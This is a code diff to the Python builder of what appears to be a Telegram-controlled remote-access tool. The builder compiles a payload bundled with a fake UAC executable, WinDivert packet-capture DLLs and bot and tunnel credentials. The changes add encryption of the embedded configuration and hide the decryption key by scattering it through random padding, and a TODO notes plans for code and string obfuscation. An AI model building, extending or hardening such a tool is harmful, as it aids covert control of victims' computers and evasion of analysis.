@@ -1,12 +1,14 @@
 # main.py
+import random
 from telepot import Bot
 from telepot.exception import TelegramError
 import json
 import os
+import secrets
 import multiprocessing as mp
 from multiprocessing.queues import Queue
 from queue import Empty
-from time import perf_counter
+from time import perf_counter, sleep
 from shutil import rmtree, copytree
 from threading import Thread
 from subprocess import Popen, PIPE, STDOUT
@@ -14,6 +16,7 @@ from os import chdir, listdir, remove
 from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
 import traceback
 import webview
+from cryptography.fernet import Fernet
 from template import html_content
 
 #TODO code and strings obfuscation
@@ -23,12 +26,15 @@ from template import html_content
 # ---------------------------------------------------------------------------
 DEBUG = True
 SEND_EXECUTABLE = False
+ENCRYPTION = True
 TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 REPO_NAME = abspath("RCPepTelegram")
+KEY_PATH = join(REPO_NAME, "key.key")
 VENV_PATH = abspath("venv")
 PY_FILE_PATH = join(REPO_NAME, "pep2.py")
 PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
 PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
+DLLSL_PATH = join(REPO_NAME, "assets", "dlls")
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
@@ -49,8 +55,10 @@ COMPILE_COMMAND = (
     "--include-data-dir=assets/model=assets/model "
     "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert.dll "
     "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert64.dll "
+    " ".join([f"--include-data-file=assets/dlls/{x}=assets/dlls/{x} " for x in listdir(DLLSL_PATH)]) + " "
     "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe "
-    f"--include-data-file={AUTH_FILE_MARKER}=auth.json"
+    f"--include-data-file={AUTH_FILE_MARKER}=auth.json " +
+    ("--include-data-file=key.key=key.key " if ENCRYPTION else "")
 )
 AUTHS_DIRNAME = abspath("auths")
 AUTHS_REPO_PATH = join(REPO_NAME, "auths")
@@ -69,6 +77,43 @@ def copy_file(src, dst):
 def clone_directory(src, dst):
     os.makedirs(dst, exist_ok=True)
     copytree(src, dst, dirs_exist_ok=True)
+
+def create_obfuscated_key_file(output_path: str) -> bytes:
+    real_key_b64 = Fernet.generate_key()           # 44 bytes
+
+    jump = random.randrange(1, 16)                # bytes to skip between each key byte
+
+    # Space needed for the scattered key
+    key_space = 44 + 43 * jump
+
+    # Total file size
+    min_size = key_space + 64
+    total_size = random.randrange(min_size, min_size + 65536)
+
+    # Random start position for first key byte
+    min_start = 32
+    max_start = total_size - key_space - 64
+    first_byte_pos = random.randrange(min_start, max_start + 1)
+
+    # Header: RCPTE (5) + jump (1) + start (4) = 10 bytes
+    magic = b"RCPTE"
+    jump_byte = jump.to_bytes(1, "big")
+    start_bytes = first_byte_pos.to_bytes(4, "big")
+    header = magic + jump_byte + start_bytes
+
+    data = bytearray(secrets.token_bytes(total_size))
+    data[0:len(header)] = header
+
+    # Scatter the 44-byte key
+    pos = first_byte_pos
+    for b in real_key_b64:
+        data[pos] = b
+        pos += 1 + jump
+
+    with open(output_path, "wb") as f:
+        f.write(data)
+
+    return real_key_b64
 
 def download_file(bot, chatid, path: str) -> None:
     def bsend(message):
@@ -114,7 +159,26 @@ def download_file(bot, chatid, path: str) -> None:
 
     bsend("✅ All file parts have been sent successfully!")
 
-# compile_worker function (your original — unchanged)
+
+def encrypt_file(fernet: Fernet, src_path, dst_path):
+    print(f"ENCRYPTING FILE: {src_path} into {dst_path}")
+    with open(src_path, "rb") as f:
+        data = f.read()
+    encrypted = fernet.encrypt(data)
+    with open(dst_path, "wb") as f:
+        f.write(encrypted)
+
+def encrypt_directory(fernet: Fernet, src_dir, dst_dir):
+    os.makedirs(dst_dir, exist_ok=True)
+    for root, dirs, files in os.walk(src_dir):
+        rel_root = os.path.relpath(root, src_dir)
+        dst_root = os.path.join(dst_dir, rel_root)
+        os.makedirs(dst_root, exist_ok=True)
+        for file in files:
+            src_path = os.path.join(root, file)
+            dst_path = os.path.join(dst_root, file + ".enc")
+            encrypt_file(fernet, src_path, dst_path)
+
 def compile_worker(
     auth_path: str,
     is_foreground: bool,
@@ -141,20 +205,35 @@ def compile_worker(
         ngrok_token = auth["ngrok_token"].strip()
         tunnel_provider = auth["tunnel_provider"].strip()
         bot = Bot(token)
-        bot.sendMessage(
-            chatid,
-            f"Your bot is being compiled\n"
-            f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}",
-        )
-        start = perf_counter()
         me = bot.getMe()
         bot_username = me["username"]
         source_name = f"{bot_username}.py"
+
+        if ENCRYPTION:
+            real_key = create_obfuscated_key_file(KEY_PATH)
+            fernet = Fernet(real_key)
+            output_queue.put(f"\nKEY FILE GENERATED FOR {bot_username}\n")
+
+        bot.sendMessage(
+            chatid,
+            f"Your bot is being compiled\n"
+            f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}\nTUNNEL PROVIDER:{tunnel_provider}\nENCRYPTION:{ENCRYPTION}",
+        )
+        start = perf_counter()
+
         copy_file(PY_FILE_PATH, source_name)
+
         run_and_capture(REQUIREMENTS_COMMAND)
         relative_auth = join("auths", pathsplit(auth_path)[-1])
         compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
-        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth)
+
+        if ENCRYPTION:
+            encrypt_file(
+                fernet=fernet,
+                src_path=relative_auth,
+                dst_path=relative_auth+".enc"
+            )
+        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth+(".enc" if ENCRYPTION else ""))
         print(f"Running: {compile_cmd}")
         rc, output = run_and_capture(compile_cmd)
        
@@ -173,7 +252,9 @@ def compile_worker(
         elapsed = (perf_counter() - start) / 60
         bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")
         if rc != 0:
-            raise RuntimeError(output.decode(errors="ignore"))
+            if isinstance(output, bytes):
+                output = output.decode(errors="ignore")
+            raise RuntimeError(output)
         if SEND_EXECUTABLE:
             download_file(bot, chatid, f"{bot_username}.exe")
     except Exception as e:
@@ -191,7 +272,9 @@ def start_poller(queue):
             try:
                 while True:
                     line = queue.get_nowait()
-                    decoded = line.decode(errors="ignore").rstrip()
+                    if isinstance(line, bytes):
+                        line = line.decode(errors="ignore")
+                    decoded = line.rstrip()
                     if decoded:
                         webview.windows[0].evaluate_js(f'writeOut({decoded!r})')
             except Empty:
